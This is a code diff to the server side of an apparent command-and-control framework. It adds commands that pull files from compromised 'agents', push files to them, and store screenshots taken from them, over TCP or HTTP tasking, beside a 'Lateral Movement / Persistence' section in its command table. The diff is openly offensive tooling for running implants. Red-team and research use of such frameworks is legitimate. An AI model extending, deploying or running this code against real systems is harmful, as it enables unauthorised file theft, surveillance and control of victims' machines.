@@ -44,13 +44,13 @@ AGENT_COMMANDS = {
         "header": "MODULE"
     },
     # === File Operations ===
-    "download <file>": {
+    "download": {
         "msg": "Download file from agent",
-        "header": "FILE DOWNLOAD"
+        "header": "DOWNLOAD"
     },
-    "upload <file>": {
+    "upload": {
         "msg": "Upload file to agent",
-        "header": "FILE UPLOAD"
+        "header": "UPLOAD"
     },
     # === Lateral Movement / Persistence ===
     "persistence": {
@@ -211,14 +211,23 @@ def module_maker(module_name):
 
     return zip_bytes + b"::::" + module
 
-def module_handler(agent_id, header, conn_type, response=None, task_id=None):
+def callback_handler(agent_id, header, conn_type, *argv, response=None, task=None):
     if conn_type == "tcp":
     
         match header.decode():
             case "SCREENSHOT":
                 file_path = f"data/{agent_id}/screenshots/{common.time_now_str_only_lines()}.png"
                 common.save_file(response, file_path,True)
-                return printer.success(f"Screenshot saved at {file_path}")
+                return f"Screenshot saved at {file_path}"
+            
+            case "DOWNLOAD_FILE_NOTFOUND":
+                return printer.fail(f"File {response.decode()} not found")
+            
+            case "DOWNLOAD_FILE_OK":     
+                file_name = argv[0]
+                file_path = f"data/{agent_id}/download/{file_name}"
+                common.save_file(response, file_path,True)
+                return printer.success(f"File saved at {file_path}")
             case _:
                 return response
             
@@ -229,7 +238,15 @@ def module_handler(agent_id, header, conn_type, response=None, task_id=None):
                 response = response
                 file_path = f"data/{agent_id}/screenshots/{common.time_now_str_only_lines()}.png"
                 common.save_file(response, file_path,True)
-                return printer.success(f"Screenshot saved at {file_path}").encode()
+                return f"Screenshot saved at {file_path}".encode()
+            
+            case "DOWNLOAD_FILE_NOTFOUND":
+                return printer.fail(f"File {response.decode()} not found")
+            
+            case "DOWNLOAD_FILE_OK":
+                file_path = f"data/{agent_id}/download/{task.command}"
+                common.save_file(response, file_path,True)
+                return printer.success(f"File saved at {file_path}")
             case _:
                 return response
 
@@ -263,15 +280,60 @@ def module(agent, arg, conn_type):
     if conn_type == "tcp":
         tcp.send_data(agent.conn, module, header)
         header ,response = tcp.recv_data(agent.conn, binary=True)
-        response = module_handler(agent.id, header, conn_type, response)
+        response = callback_handler(agent.id, header, conn_type, response)
         
     elif conn_type == "http":
-        task_id = taskmng.add_task(agent.id, module_name, header)
+        task_id = taskmng.add_task(agent.id, module_name, header, module)
+        response = f"Task {task_id} added"
+
+    return printer.success(response)
+
+
+def upload(agent, data, conn_type):
+    if not data:
+        return printer.fail("Missing filename|bytes")
+
+    parts = data.split(b"::::")
+    if not len(parts) == 2:
+        return printer.fail("Invalid filename|bytes")
+    
+    file_name = parts[0].decode()
+        
+    header = AGENT_COMMANDS.get("upload")["header"]
+    if conn_type == "tcp":
+
+        tcp.send_data(agent.conn, data, header)
+        _, response = tcp.recv_data(agent.conn)
+        
+    elif conn_type == "http":
+        task_id = taskmng.add_task(agent.id, f"upload {file_name}", header, data)
+        response = f"Task {task_id} added"
+
+    return printer.success(response)
+
+def download(agent, data, conn_type):
+    if not data:
+        return printer.fail("Missing filename|path")
+    
+    parts = data.split(b"::::")
+    if not len(parts) == 2:
+        return printer.fail("Invalid file_name|path")
+    
+    file_name = parts[0].decode()
+        
+    header = AGENT_COMMANDS.get("download")["header"]
+    if conn_type == "tcp":
+
+        tcp.send_data(agent.conn, data, header)
+        header, response = tcp.recv_data(agent.conn, binary=True)
+        response = callback_handler(agent.id, header, conn_type, file_name, response=response)
+        
+    elif conn_type == "http":
+        task_id = taskmng.add_task(agent.id, file_name, header, data)
         response = printer.success(f"Task {task_id} added")
 
     return response
-
-
+    
 def exit():
     return printer.signal("Main Menu")
 
@@ -291,3 +353,9 @@ def cmd_help():
 
 def module_help():
     return printer.info("Usage: module <name> | list")
+
+def upload_help():
+    return printer.info("Usage: upload <file_name> <path>")
+
+def download_help():
+    return printer.info("Usage: download <file_name> <path>")
